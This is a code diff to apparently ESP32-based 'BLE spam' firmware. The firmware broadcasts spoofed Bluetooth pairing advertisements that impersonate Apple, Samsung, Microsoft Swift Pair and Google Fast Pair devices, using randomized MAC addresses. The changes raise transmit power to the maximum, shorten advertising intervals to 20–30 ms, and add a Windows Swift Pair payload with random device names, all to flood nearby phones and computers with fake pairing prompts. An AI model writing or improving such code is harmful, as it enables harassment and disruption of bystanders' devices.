@@ -29513,13 +29513,14 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
         struct ble_gap_ext_adv_params ext_adv_params;
         memset(&ext_adv_params, 0, sizeof(ext_adv_params));
         ext_adv_params.connectable = 0;
-        ext_adv_params.scannable = 0;
+        ext_adv_params.scannable = 1;  // ADV_SCAN_IND for better receiver compatibility
         ext_adv_params.legacy_pdu = 1;
         ext_adv_params.own_addr_type = BLE_OWN_ADDR_RANDOM;
         ext_adv_params.primary_phy = BLE_HCI_LE_PHY_1M;
         ext_adv_params.secondary_phy = BLE_HCI_LE_PHY_1M;
-        ext_adv_params.itvl_min = BLE_GAP_ADV_ITVL_MS(100);
-        ext_adv_params.itvl_max = BLE_GAP_ADV_ITVL_MS(150);
+        ext_adv_params.itvl_min = BLE_GAP_ADV_ITVL_MS(20);
+        ext_adv_params.itvl_max = BLE_GAP_ADV_ITVL_MS(30);
+        ext_adv_params.tx_power = 20;  // +20 dBm max TX power
         ext_adv_params.sid = BLE_SPAM_ADV_INSTANCE;
 
         ESP_LOGI(TAG, "[SPAM] timer: configuring instance %d (connectable=%d, scannable=%d, legacy_pdu=%d, own_addr_type=%d)",
@@ -29595,7 +29596,7 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
     // disable to propagate before set_addr/set_data to avoid EINVAL host validation
     uint64_t stop_time_us = esp_timer_get_time();
     ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
-    vTaskDelay(pdMS_TO_TICKS(10));
+    vTaskDelay(pdMS_TO_TICKS(30));
     uint64_t after_delay_us = esp_timer_get_time();
     st->started = false;
     ESP_LOGD(TAG, "[SPAM] pkt%d stopped adv, delayed %.1f ms", ble_spam_count, (after_delay_us - stop_time_us) / 1000.0);
@@ -29605,7 +29606,8 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
     if (burst_mode) {
         // Burst modes (Samsung/SmartTag) reuse same MAC for 4 packets
         // (minted on packet 1, reused on packets 2-4)
-        rnd_addr = st->samsung_burst_mac;  // Copy entire struct (val + type)
+        rnd_addr.type = BLE_ADDR_RANDOM;  // Explicitly set type before copy
+        memcpy(rnd_addr.val, st->samsung_burst_mac.val, 6);
         ESP_LOGD(TAG, "[SPAM] pkt%d using burst MAC (count=%d)", ble_spam_count, st->samsung_burst_count);
     } else {
         // Normal per-packet randomization for all other modes
@@ -29644,6 +29646,8 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
     uint8_t svc_data_len = 0;
     uint8_t at_mfg[29];
     uint8_t sa_mfg[9];
+    uint8_t win_mfg[32];
+    static uint8_t win_name[12];  // Random device name for Windows
 
     switch (cur_mode) {
     case BLE_SPAM_MODE_APPLE: {
@@ -29740,12 +29744,36 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
         fields.mfg_data_len = sizeof(sa_mfg);
         break;
     }
-    case BLE_SPAM_MODE_WINDOWS:
+    case BLE_SPAM_MODE_WINDOWS: {
+        // Microsoft Swift Pair: manufacturer data (0x0006 Microsoft ID) + random device name
+        win_mfg[0] = 0x06; win_mfg[1] = 0x00;  // Microsoft Company ID (little-endian)
+        win_mfg[2] = 0x03;                      // SubType: Windows Swift Pair
+        win_mfg[3] = 0x00;                      // Reserved
+        win_mfg[4] = 0x80;                      // Confidence/Flags
+
+        // Generate random UTF-8 device name (5–10 bytes)
+        int name_len = 5 + (esp_random() % 6);
+        for (int i = 0; i < name_len; i++) {
+            win_name[i] = 'A' + (esp_random() % 26);
+        }
+
+        memcpy(&win_mfg[5], win_name, name_len);
+        fields.mfg_data = win_mfg;
+        fields.mfg_data_len = 5 + name_len;
+
+        // Also set Complete Local Name
+        fields.name = (const uint8_t *)win_name;
+        fields.name_len = name_len;
+        fields.name_is_complete = 1;
+
+        st->windows_idx = (st->windows_idx + 1) % WINDOWS_PAYLOAD_COUNT;
+        break;
+    }
     default:
         use_svc = true;
-        svc_data = (st->windows_idx == 0) ? s_windows_sp_svc : s_windows_sp_svc2;
-        svc_data_len = sizeof(s_windows_sp_svc);
-        st->windows_idx = (st->windows_idx + 1) % WINDOWS_PAYLOAD_COUNT;
+        svc_data = s_google_fp_payloads[st->google_idx];
+        svc_data_len = sizeof(s_google_fp_payloads[0]);
+        st->google_idx = (st->google_idx + 1) % GOOGLE_PAYLOAD_COUNT;
         break;
     }
 
